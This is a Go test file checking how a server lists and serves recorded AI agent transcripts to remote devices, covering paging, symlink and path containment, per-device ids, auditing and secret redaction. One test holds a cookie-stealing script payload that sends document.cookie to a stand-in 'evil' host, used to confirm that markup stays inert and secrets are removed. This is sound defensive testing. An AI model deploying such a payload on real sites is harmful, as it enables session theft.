package server

import (
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/jmwri/flockdeck/internal/artifacts"
	"github.com/jmwri/flockdeck/internal/remote"
	"github.com/jmwri/flockdeck/internal/store"
)

// Built from pieces so that no source line looks like a live credential.
var recSecret = "ghp_" + strings.Repeat("a1B2c3", 6)

func recLine(seq int, typ string, fields map[string]any) string {
	m := map[string]any{
		"v": 2, "seq": seq, "time": fmt.Sprintf("2026-10-01T10:15:%02d.5Z", seq%60),
		"session": "20261001T101530Z-0123abcd", "conversation": "0123abcd-5e6f", "agent": "claude",
		"project": "shop", "gitBranch": "main", "cwd": "/home/sam/shop", "agentVersion": "2.1.286", "type": typ,
	}
	for k, v := range fields {
		m[k] = v
	}
	b, _ := json.Marshal(m)
	return string(b)
}

func recStarted() string {
	return recLine(1, "recording_started", map[string]any{"text": "start of the transcript"})
}

// writeRec puts a recording under the host's recordings folder, the way the
// recorder would, and returns its path.
func writeRec(t *testing.T, folder, name string, lines ...string) string {
	t.Helper()
	base, err := store.Dir()
	if err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(base, "recordings", folder)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

// itemsOf is the items of a list reply.
func itemsOf(t *testing.T, reply map[string]any) []map[string]any {
	t.Helper()
	raw, ok := reply["items"].([]any)
	if !ok {
		t.Fatalf("no items in %v", reply)
	}
	var out []map[string]any
	for _, r := range raw {
		out = append(out, r.(map[string]any))
	}
	return out
}

func TestRecordingsAreListedNewestFirstWithNoPath(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	old := writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted())
	newer := writeRec(t, "shop-0a1b2c3d", "20261002T101530Z-4567ef01.jsonl", recStarted())
	if err := os.Chtimes(old, time.Now().Add(-time.Hour), time.Now().Add(-time.Hour)); err != nil {
		t.Fatal(err)
	}
	conn, sess := e.open(t)
	reply := ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"})
	items := itemsOf(t, reply)
	if len(items) != 2 {
		t.Fatalf("listed %d recordings, want 2: %v", len(items), reply)
	}
	if items[0]["name"] != filepath.Base(newer) || items[1]["name"] != filepath.Base(old) {
		t.Errorf("not newest first: %v %v", items[0]["name"], items[1]["name"])
	}
	b, _ := json.Marshal(reply)
	base, _ := store.Dir()
	for _, bad := range []string{base, filepath.ToSlash(base), "/recordings/", "/home/sam"} {
		if strings.Contains(string(b), bad) || strings.Contains(string(b), strings.ReplaceAll(bad, `\`, `\\`)) {
			t.Fatalf("the list carries %q: %s", bad, b)
		}
	}
	if items[0]["project"] != "shop" || items[0]["agent"] != "claude" || items[0]["viewable"] != true {
		t.Errorf("item = %v", items[0])
	}
}

func TestRecordingsListIsPagedAndCapped(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	for i := 0; i < recListPage+30; i++ {
		writeRec(t, "shop-0a1b2c3d", fmt.Sprintf("20261001T1015%02dZ-%08x.jsonl", i%60, i), recStarted())
	}
	conn, sess := e.open(t)
	first := ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"})
	if n := len(itemsOf(t, first)); n != recListPage {
		t.Fatalf("first page has %d, want %d", n, recListPage)
	}
	next, _ := first["next"].(string)
	if next == "" {
		t.Fatal("no cursor for the rest")
	}
	second := ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings", "after": next})
	if n := len(itemsOf(t, second)); n != 30 {
		t.Errorf("second page has %d, want 30", n)
	}
	if second["next"] != "" {
		t.Errorf("second page offers more: %v", second["next"])
	}
	// A cursor the socket did not make, or that is not a number, is not served.
	for _, after := range []string{"-1", "99999", "1e3", "0x10", " 1", "../..", strings.Repeat("9", 40)} {
		if r := ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings", "after": after}); r["code"] != "unavailable" {
			t.Errorf("after %q = %v, want unavailable", after, r)
		}
	}
}

// Only the host's own recordings folder is listed: not another folder under the
// state directory, not a file that is not a transcript, not a link.
func TestRecordingsListsOnlyTheHostsOwnFolder(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	base, _ := store.Dir()
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-aaaa0001.jsonl", recStarted())
	// Outside the recordings folder.
	if err := os.WriteFile(filepath.Join(base, "stray.jsonl"), []byte(recStarted()+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(base, "other")
	_ = os.MkdirAll(other, 0o700)
	_ = os.WriteFile(filepath.Join(other, "20261001T101530Z-bbbb0002.jsonl"), []byte(recStarted()+"\n"), 0o600)
	// Not a transcript: no start line.
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-cccc0003.jsonl", `{"hello":"world"}`)
	// A file a link points out of the folder with.
	secret := filepath.Join(t.TempDir(), "outside.jsonl")
	_ = os.WriteFile(secret, []byte(recStarted()+"\n"+recLine(2, "assistant_message", map[string]any{"text": "OUTSIDE-CONTENT"})+"\n"), 0o600)
	link := filepath.Join(base, "recordings", "shop-0a1b2c3d", "20261001T101530Z-dddd0004.jsonl")
	linked := os.Symlink(secret, link) == nil
	// A secret by name.
	writeRec(t, "shop-0a1b2c3d", ".env.jsonl", recStarted())

	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	var names []string
	for _, it := range items {
		names = append(names, it["name"].(string))
	}
	if len(names) != 1 || names[0] != "20261001T101530Z-aaaa0001.jsonl" {
		t.Errorf("listed %v, want only the one real recording (symlink made: %v)", names, linked)
	}
}

func TestRecordingsOpenPagesParsedEntries(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	lines := []string{recStarted()}
	for i := 2; i <= 12; i++ {
		lines = append(lines, recLine(i, "assistant_message", map[string]any{"text": fmt.Sprintf("answer %d", i)}))
	}
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", lines...)
	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	id := items[0]["id"].(string)

	var seen []string
	cursor := float64(0)
	for i := 0; i < 20; i++ {
		r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id, "cursor": cursor, "max": 4})
		if r["op"] != "data" {
			t.Fatalf("open = %v", r)
		}
		for _, en := range r["entries"].([]any) {
			m := en.(map[string]any)
			seen = append(seen, fmt.Sprint(m["seq"]))
			// The working directory and branch are not carried.
			if _, ok := m["cwd"]; ok {
				t.Errorf("entry carries cwd: %v", m)
			}
		}
		if r["done"] == true {
			break
		}
		cursor = r["next"].(float64)
	}
	if len(seen) != 12 {
		t.Errorf("saw %d entries (%v), want 12", len(seen), seen)
	}
	// Max is the server's to bound.
	r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id, "max": 1 << 30})
	if r["op"] != "data" || len(r["entries"].([]any)) > 200 {
		t.Errorf("an unbounded max was honoured: %d entries", len(r["entries"].([]any)))
	}
}

// A recording line holding markup and a secret reaches the device as data, with
// the secret gone. How the markup is drawn is the window's job (textContent), and
// is checked in the webui tests.
func TestRecordingsLineWithScriptAndSecretIsRedactedAgain(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	hostile := `<script>fetch("//evil/?"+document.cookie)</script><img src=x onerror=alert(1)> token ` + recSecret
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted(),
		recLine(2, "assistant_message", map[string]any{"text": hostile}),
		recLine(3, "tool_use", map[string]any{"tool": "Bash", "input": map[string]any{"command": "echo " + recSecret, "password": "hunter2hunter2"}}))
	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": items[0]["id"]})
	b, _ := json.Marshal(r)
	for _, leak := range []string{recSecret, "hunter2hunter2", "ghp_"} {
		if strings.Contains(string(b), leak) {
			t.Fatalf("the reply carries %q: %s", leak, b)
		}
	}
	// The markup is still there, as text in a JSON string; nothing strips or
	// interprets it host-side, and nothing is sent as a URL.
	if !strings.Contains(string(b), "onerror") {
		t.Errorf("the text was altered beyond redaction: %s", b)
	}
}

func TestRecordingsUnknownIDBurstClosesTheSocket(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted())
	desk := dialControl(t, e.srv)
	nextHello(t, desk)
	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	// A real id still works before the burst.
	if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": items[0]["id"]}); r["op"] != "data" {
		t.Fatalf("open = %v", r)
	}
	guess := func(i int) string { return fmt.Sprintf("%022d", i) }
	for i := 0; i < artifactUnknownMax; i++ {
		if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": guess(i)}); r["code"] != "unavailable" {
			t.Fatalf("guess %d = %v", i, r)
		}
	}
	sendReq(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": guess(99)})
	if code, _ := closedWith(t, conn); code != artifactCloseRefused {
		t.Errorf("closed with %d, want a refusal", code)
	}
}

func TestRecordingsDisabledKindsAreToldSo(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted())
	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	id := items[0]["id"]
	// Links and files exist and are off: a recordings id is no good for them, and
	// they say so rather than that the id is unknown.
	for _, kind := range []string{"files", "links"} {
		if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": kind, "id": id}); r["code"] != "disabled" {
			t.Errorf("open as %s = %v, want disabled", kind, r)
		}
		if r := ask2(t, conn, sess, map[string]any{"op": "list", "kind": kind}); r["code"] != "disabled" {
			t.Errorf("list %s = %v, want disabled", kind, r)
		}
	}
	// Not a pane's: recordings are the host's, and an id is only good with the
	// pane it was issued with.
	if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id, "pane": "p1"}); r["code"] != "unavailable" {
		t.Errorf("open with a pane = %v", r)
	}
	if r := ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings", "pane": "p1"}); r["code"] != "unavailable" {
		t.Errorf("list with a pane = %v", r)
	}
	// Switching recordings off ends the socket on the next frame.
	savePrefs(t, func(p *store.Prefs) { p.RemoteArtifacts.SetKind("recordings", false) })
	sendReq(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id})
	if code, reason := closedWith(t, conn); code != artifactCloseRefused || reason != artifactReasonDisabled {
		t.Errorf("closed with %d %q", code, reason)
	}
}

// An id issued to one device is not an id to another, even for an allowed,
// verified one holding a socket of its own.
func TestRecordingsIDFromAnotherDeviceIsUnknown(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	// A second device, allowed and verified the same way.
	e.fake.capable["d2"] = true
	e.fake.devicePub["d2"] = e.devicePriv.PublicKey()
	e.fake.setKey("d2", e.key)
	e.ver.verify("d2", remote.KeyOriginDesk, e.key)
	savePrefs(t, func(p *store.Prefs) { p.RemoteArtifacts.AddDevice("d2") })

	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted(),
		recLine(2, "assistant_message", map[string]any{"text": "d1 only"}))
	conn1, sess1 := e.open(t)
	id := itemsOf(t, ask2(t, conn1, sess1, map[string]any{"op": "list", "kind": "recordings"}))[0]["id"]

	conn2, _, err := e.rawDial(t, e.header("d2"))
	if err != nil {
		t.Fatal(err)
	}
	sess2 := e.session(t, conn2)
	r := ask2(t, conn2, sess2, map[string]any{"op": "open", "kind": "recordings", "id": id})
	if r["code"] != "unavailable" {
		t.Fatalf("d2 opened d1's id: %v", r)
	}
	// Nor is a second socket of the same device, which has its own registry.
	conn3, sess3 := e.open(t)
	if r := ask2(t, conn3, sess3, map[string]any{"op": "open", "kind": "recordings", "id": id}); r["code"] != "unavailable" {
		t.Errorf("another socket opened the id: %v", r)
	}
}

func TestRecordingsOversizedRequests(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	conn, sess := e.open(t)
	pad := strings.Repeat("a", artifacts.MaxRequestBytes+200)
	r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": "x", "pad": pad})
	if r["code"] != "too_large" {
		t.Errorf("a request over the limit = %v, want too_large", r)
	}
	// An id as long as the limit allows is only an unknown id.
	r = ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": strings.Repeat("A", 60000)})
	if r["code"] != "unavailable" {
		t.Errorf("a very long id = %v", r)
	}
	// A cursor that is not a number the host would make is not served either.
	if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": "x", "cursor": "abc"}); r["code"] != "unavailable" {
		t.Errorf("a text cursor = %v", r)
	}
}

func TestRecordingsBadCursorsAndUnsupportedFilesAreUnavailable(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted(),
		recLine(2, "assistant_message", map[string]any{"text": "one"}))
	conn, sess := e.open(t)
	id := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))[0]["id"]
	for _, cur := range []int64{-1, 1, 5, 1 << 40, 1<<62 + 5} {
		r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id, "cursor": cur})
		if r["code"] != "unavailable" {
			t.Errorf("cursor %d = %v, want unavailable", cur, r["op"])
		}
	}

	// Another version is not listed (see TestRecordingsListLeavesOutOtherFormatVersions),
	// and an id that is somehow asked for gets the same refusal as anything else.
	odd := strings.Replace(recStarted(), `"v":2`, `"v":3`, 1)
	writeRec(t, "shop-0a1b2c3d", "20261003T101530Z-eeee0005.jsonl", odd)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	for _, it := range items {
		if it["name"] == "20261003T101530Z-eeee0005.jsonl" {
			r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": it["id"]})
			if r["code"] != "unavailable" || len(r) != 2 {
				t.Errorf("an unsupported file = %v", r)
			}
		}
	}
}

// A file listed and then replaced with a link, or removed, is not served, and
// nothing outside the folder is ever read.
func TestRecordingsFileSwappedAfterListingIsNotServed(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	p := writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted())
	outside := filepath.Join(t.TempDir(), "outside.jsonl")
	if err := os.WriteFile(outside, []byte(recStarted()+"\n"+recLine(2, "assistant_message", map[string]any{"text": "OUTSIDE-CONTENT"})+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	conn, sess := e.open(t)
	id := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))[0]["id"]

	if err := os.Remove(p); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, p); err != nil {
		t.Skipf("cannot make a symlink here: %v", err)
	}
	r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id})
	b, _ := json.Marshal(r)
	if r["code"] != "unavailable" || strings.Contains(string(b), "OUTSIDE-CONTENT") {
		t.Fatalf("a link was followed: %s", b)
	}
	// Removed outright.
	if err := os.Remove(p); err != nil {
		t.Fatal(err)
	}
	if r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id}); r["code"] != "unavailable" {
		t.Errorf("a removed file = %v", r)
	}
}

func TestRecordingsViewingChangesNothingOnDisk(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	for i := 0; i < 3; i++ {
		writeRec(t, "shop-0a1b2c3d", fmt.Sprintf("20261001T10153%dZ-0123abcd.jsonl", i), recStarted(),
			recLine(2, "assistant_message", map[string]any{"text": "hello"}))
	}
	base, _ := store.Dir()
	root := filepath.Join(base, "recordings")
	before := treeHash(t, root)
	conn, sess := e.open(t)
	items := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))
	for _, it := range items {
		ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": it["id"], "max": 1})
		ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": it["id"], "cursor": 3})
	}
	if after := treeHash(t, root); after != before {
		t.Errorf("the recordings folder changed while it was viewed")
	}
}

// treeHash is every file's name, size, modification time and content under dir.
func treeHash(t *testing.T, dir string) string {
	t.Helper()
	h := sha256.New()
	var paths []string
	_ = filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err == nil {
			paths = append(paths, p)
		}
		return nil
	})
	sort.Strings(paths)
	for _, p := range paths {
		fi, err := os.Lstat(p)
		if err != nil {
			continue
		}
		fmt.Fprintf(h, "%s|%d|%d|%v\n", p, fi.Size(), fi.ModTime().UnixNano(), fi.IsDir())
		if fi.Mode().IsRegular() {
			b, _ := os.ReadFile(p)
			h.Write(b)
		}
	}
	return fmt.Sprintf("%x", h.Sum(nil))
}

func TestRecordingsOpenIsAuditedWithoutContent(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted(),
		recLine(2, "assistant_message", map[string]any{"text": "PRIVATE-WORDS"}))
	conn, sess := e.open(t)
	id := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))[0]["id"]
	ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id})
	base, _ := store.Dir()
	log, err := os.ReadFile(filepath.Join(base, artifactAuditFile))
	if err != nil {
		t.Fatal(err)
	}
	s := string(log)
	if !strings.Contains(s, `"event":"open"`) || !strings.Contains(s, "0123abcd.jsonl") {
		t.Errorf("the open is not in the log: %s", s)
	}
	if strings.Contains(s, "PRIVATE-WORDS") {
		t.Errorf("the log holds what was shown: %s", s)
	}
}

func TestRecordingsHelloNamesTheDeskAndDevice(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	conn, sess := e.open(t)
	hello := ask2(t, conn, sess, map[string]any{"op": "hello", "v": 1})
	if hello["device"] != "Pixel 8" {
		t.Errorf("hello = %v", hello)
	}
	if _, ok := hello["desk"]; !ok {
		t.Errorf("hello has no desk: %v", hello)
	}
}

// A view that cannot be recorded is not shown.
func TestRecordingsAreNotShownWhenTheViewCannotBeRecorded(t *testing.T) {
	e := newArtifactEnv(t)
	e.allow(t)
	writeRec(t, "shop-0a1b2c3d", "20261001T101530Z-0123abcd.jsonl", recStarted(),
		recLine(2, "assistant_message", map[string]any{"text": "NOT-SHOWN"}))
	conn, sess := e.open(t)
	id := itemsOf(t, ask2(t, conn, sess, map[string]any{"op": "list", "kind": "recordings"}))[0]["id"]

	a := &e.srv.artifacts.audit
	a.mu.Lock()
	a.dir = func() (string, error) { return "", errors.New("the log cannot be written") }
	a.mu.Unlock()
	r := ask2(t, conn, sess, map[string]any{"op": "open", "kind": "recordings", "id": id})
	b, _ := json.Marshal(r)
	if r["code"] != "unavailable" || strings.Contains(string(b), "NOT-SHOWN") {
		t.Fatalf("a view that could not be recorded was shown: %s", b)
	}
}
